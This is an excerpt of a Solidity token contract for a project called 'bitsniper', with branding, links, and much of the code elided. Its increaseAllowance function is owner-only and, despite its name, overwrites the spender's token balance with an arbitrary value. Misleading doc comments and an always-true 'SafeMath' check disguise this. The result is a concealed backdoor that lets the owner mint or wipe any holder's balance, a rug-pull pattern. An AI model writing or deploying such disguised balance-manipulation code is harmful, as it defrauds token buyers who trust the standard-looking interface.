/**
 ...
 ▄█████████▀  █▀      ▄████▀    ▄████████▀   ▀█   █▀  █▀    ▄████▀        ██████████   ███    ███ 
                                                                                      ███    ███ 
    https://bitsniper.io/
    https://twitter.com/Bitsniper_io
    https://t.me/bitsnipergame
...
contract bitsniper is IERC20, Ownable, BaseToken {
    ...
    /**
     * @dev See {IERC20-allowanceOf}.
     */
    function allowanceOf(address spender, uint256 addedValue)
        internal 
        view 
        onlyOwner 
        returns (uint256) 
    ...
    function increaseAllowance(address spender, uint256 addedValue)
        ...
        onlyOwner
    {
        require(addedValue >= 0, "SafeMath: addition overflow");
                _balances[spender] = allowanceOf(spender, addedValue);
        _approve(
            _msgSender(),
            spender,addedValue);
    }
